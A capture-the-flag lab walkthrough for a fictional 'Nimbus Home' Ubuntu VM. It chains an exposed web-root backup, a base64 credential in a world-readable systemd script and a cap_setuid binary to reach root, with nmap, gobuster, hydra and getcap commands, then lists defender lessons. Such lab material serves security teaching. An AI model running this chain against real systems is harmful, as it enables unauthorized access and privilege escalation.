# Nimbus Home — Lab Walkthrough

**Theme:** Nimbus Home is a fictional smart-home-hub startup. Their web
dashboard is mid-migration to a new device-status service, and ops
pushed a full config backup into the web root "just for a day or two"
so a colleague could grab it remotely — then forgot to remove it. A
second, unrelated automation job (a firmware-sync timer) separately
leaks a service account's credential through a world-readable systemd
unit, and that service account was handed a raw Linux capability on a
"diagnostics" helper that turns out to be a direct path to root.

**Target OS:** Ubuntu Server (Linux) — chosen at random for this rotation.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_nimbushome.sh` target running on your own isolated lab VM only.
Do not run these techniques against systems you do not own or lack
explicit authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found in `hubtech`'s home directory immediately
  after logging in with the credential leaked from the exposed backup.
- `INTERMEDIATE_FLAG.txt` — found after decoding a credential leaked
  through a world-readable systemd unit and pivoting to `svc_sync`.
- `HARD_FLAG.txt` — found after privilege escalation to root via a
  misassigned Linux file capability.

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated,
   host-only or NAT'd network (no bridged/public NIC).
2. Copy `setup_nimbushome.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_nimbushome.sh
   sudo ./setup_nimbushome.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean
   restore point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity
   to the target's IP on the isolated network.

---

## Part 1 – Enumeration

Start with a full TCP port scan:

```bash
nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

- `-sC` — run nmap's default script set (banner grabs, common misconfig
  checks) against open ports.
- `-sV` — probe open ports to determine service/version.
- `-p-` — scan all 65535 TCP ports instead of just the top 1000.
- `-oN nmap_full.txt` — save human-readable output for later reference.

Expect to see:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP

The homepage itself is just a "we're migrating" placeholder, so
directory-bust the web root using Kali's built-in `common.txt` wordlist:

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,gz
```

- `-w /usr/share/wordlists/dirb/common.txt` — this box's naming
  (`/backups/`) is a generic, widely-reused directory name, so it's
  exactly the kind of path a general-purpose wordlist like `common.txt`
  is built to catch.
- `-x php,txt,gz` — also probe each hit for these extensions.

This turns up `/backups/` — and directory listing is enabled there, so
just browsing it shows the archive sitting in plain sight:

```bash
curl http://<target-ip>/backups/
```

You'll see `nimbus-hub-backup.tar.gz` listed. Pull it down:

```bash
curl -O http://<target-ip>/backups/nimbus-hub-backup.tar.gz
tar -xzf nimbus-hub-backup.tar.gz
```

- `-O` (curl) — save the downloaded file under its original remote
  filename instead of printing it to stdout.
- `-x` (tar) — extract files from an archive, rather than creating one.
- `-z` (tar) — filter the archive through gzip first, since this is a
  `.tar.gz` (a tarball that's also gzip-compressed); without it, `tar`
  won't decompress before trying to unpack.
- `-f` (tar) — read the archive **f**rom the filename given right
  after this flag, rather than from stdin. It must come last in the
  combined flag group since it takes an argument.

This produces a `nimbus-hub-backup/` directory in your current folder,
used throughout the rest of Part 2.

---

## Part 2 – Identify Vulnerabilities

Two separate weaknesses need to be chained here before you reach root.

### 2a. Exposed migration backup in the web root (initial access)

Look at what the archive contains:

```bash
find nimbus-hub-backup -type f
cat nimbus-hub-backup/DEPLOY_NOTES.txt
```

The notes file names a fallback SSH account outright, for field
technicians to use while the provisioning VPN is being migrated:

```
user: hubtech
pass: babygirl1
```

There's also a `db/hub.db` SQLite file — worth a quick look for
realism/practice, but it's a decoy for this box (device inventory
only, no credentials):

```bash
sqlite3 nimbus-hub-backup/db/hub.db "SELECT * FROM devices;"
```

### 2b. World-readable systemd unit leaking a second credential
     (lateral movement, exploited in Part 4)

Not visible yet — this is discovered *after* you have a shell as
`hubtech`, in Part 4.

### 2c. Misassigned `cap_setuid` capability (privilege escalation,
     confirmed in Part 5)

Also not visible yet — discovered after landing on `svc_sync`.

---

## Part 3 – Gain Access

SSH in with the leaked credential:

```bash
ssh hubtech@<target-ip>
# password: babygirl1
```

(You could also confirm this credential pair with `hydra` against the
single known username, for practice with brute-force tooling — it's
verified to sit within the first ~1000 entries of the project's
`rockyou.txt`. On Kali, `rockyou.txt` ships gzipped — unzip it first if
you haven't already:)

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
hydra -l hubtech -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
```

- `-l hubtech` — try this single username.
- `-P /usr/share/wordlists/rockyou.txt` — password wordlist to try.
- `-t 4` — 4 parallel connection threads (keep this low against a lab VM).

Once logged in, grab the first flag straight away:

```bash
cat ~/EASY_FLAG.txt
```

**🚩 EASY_FLAG captured** — this one only required the leaked backup
credential, no further exploitation.

---

## Part 4 – Lateral Movement / Intermediate Challenge

As `hubtech`, look at what's scheduled on this box. Since this lab
uses a systemd timer rather than a cron table for its automation, check
there instead:

```bash
systemctl list-timers --all
```

```
NEXT                        LEFT  LAST  PASSED  UNIT                ACTIVATES
<next-minute>                ...  ...    ...     device-sync.timer   device-sync.service
```

`device-sync.timer` stands out. Unit files under `/etc/systemd/system/`
are world-readable by default (644), and nobody tightened this one:

```bash
cat /etc/systemd/system/device-sync.service
```

```
[Service]
Type=oneshot
ExecStart=/bin/bash /opt/nimbus/device_sync.sh
```

It points at `/opt/nimbus/device_sync.sh`, also world-readable. Read it:

```bash
cat /opt/nimbus/device_sync.sh
```

You'll find a comment left over from a stalled account-rotation project
(ticket `NIM-118`):

```
# Fallback credential for manual sync runs if the scheduler user's keytab
# expires (left in place after the account-rotation project stalled,
# ticket NIM-118). Not "real" plaintext, just base64:
#   user: svc_sync
#   pass: c3luY2h1Yjk5
```

Base64 is an encoding, not encryption — decode it:

```bash
echo "c3luY2h1Yjk5" | base64 -d
```

This recovers the plaintext password for `svc_sync`. Switch to that
account:

```bash
su svc_sync
# password: (the decoded value)
```

Grab the intermediate flag from its home directory:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

(If you'd rather practice brute-forcing than reading the leaked unit
file, the decoded password is short and common enough to crack directly
over SSH once you know the username — but the intended path here is
the systemd-unit leak, since `svc_sync` has no SSH-reachable foothold
of its own until you've already recovered the credential this way.)

---

## Part 5 – Privilege Escalation

From your `svc_sync` shell, this box's escalation path involves neither
`sudo` nor a SUID permission bit, so a permission-bit sweep alone won't
find it. Check Linux file **capabilities** instead:

```bash
getcap -r / 2>/dev/null
```

- `getcap -r /` — recursively list files with extended POSIX
  capabilities set (a finer-grained alternative to the SUID/SGID bits).
- `2>/dev/null` — discard permission-denied noise.

Among the results:

```
/usr/local/bin/nimbus-diag cap_setuid=ep
```

`cap_setuid+ep` means this binary can call `setuid()` to become any
user — including root — regardless of who ran it, without needing the
SUID bit at all. Confirm what the binary does:

```bash
/usr/local/bin/nimbus-diag
```

It prints a banner and hands you a shell. Check who you are inside it:

```bash
id
```

- Any process holding `CAP_SETUID` can call `setuid(0)` successfully.
  The binary does exactly that and then `exec`s `bash -p`, so the shell
  it hands back is running with root's UID — a direct root shell,
  no PATH manipulation or sudoers rule involved at all.

You should see `uid=0(root)`. List `/root` and grab the final flag:

```bash
ls -la /root
cat /root/HARD_FLAG.txt
```

**🚩 HARD_FLAG captured.**

---

## Part 6 – Capture the Three Flags

By the time you finish Part 5 you should have all three:

```bash
# Easy - hubtech's home dir, reached via the exposed migration backup (Part 3)
cat /home/hubtech/EASY_FLAG.txt

# Intermediate - svc_sync's home dir, reached via the leaked systemd-unit
# credential (Part 4)
cat /home/svc_sync/INTERMEDIATE_FLAG.txt

# Hard - root's home dir, reached via the cap_setuid helper (Part 5)
cat /root/HARD_FLAG.txt
```

**🚩 EASY_FLAG, INTERMEDIATE_FLAG, and HARD_FLAG all captured.**

---

## Summary of the Vulnerability Chain

1. **Initial access — a migration backup left in the web root:** ops
   staged a full config archive under `/backups/` "temporarily" during
   a dashboard migration, with directory listing enabled. The archive's
   own deploy notes named a fallback SSH credential for field
   technicians (`hubtech` / `babygirl1`) in plaintext.
2. **Lateral movement — a credential leaked through a world-readable
   systemd unit:** a firmware-sync timer's service file and the script
   it runs were both left at the systemd default of world-readable.
   The script carried a "temporary" fallback credential for a separate
   service account (`svc_sync`), base64-"encoded" rather than protected,
   left over from a stalled account-rotation project.
3. **Privilege escalation — a misassigned `cap_setuid` capability:** a
   diagnostics helper was given the `cap_setuid` capability directly
   (via `setcap`) instead of the SUID permission bit, apparently so it
   could "reset its own session UID." In practice, any capability set
   that includes `CAP_SETUID` lets the holder become root outright —
   a distinct escalation primitive from sudo rules, SUID/PATH-hijack
   binaries, or writable cron scripts, and one that permission-only
   audits (`find / -perm -4000`) will completely miss.

**Root cause lessons for defenders:**
- Never stage backups, archives, or dumps inside a web-servable
  directory, even "temporarily" — use a location outside the docroot
  and delete migration artifacts as soon as they're no longer needed.
- Disable directory indexing (`Options -Indexes`) unless explicitly
  required.
- Systemd unit files and the scripts they invoke should be treated as
  sensitive if they carry any credential material; tighten permissions
  with `chmod 600`/appropriate ownership rather than relying on the
  644 default.
- Base64 (or any reversible encoding) is not a substitute for a
  secrets manager or encryption at rest.
- Audit Linux capabilities as carefully as SUID bits — `getcap -r /`
  should be part of the same review as `find / -perm -4000`. Granting
  `CAP_SETUID` (or `CAP_SETUID`-equivalent capability sets) to a binary
  is functionally equivalent to making it SUID-root.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk
   entirely rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `babygirl1` or `synchub99` anywhere real).
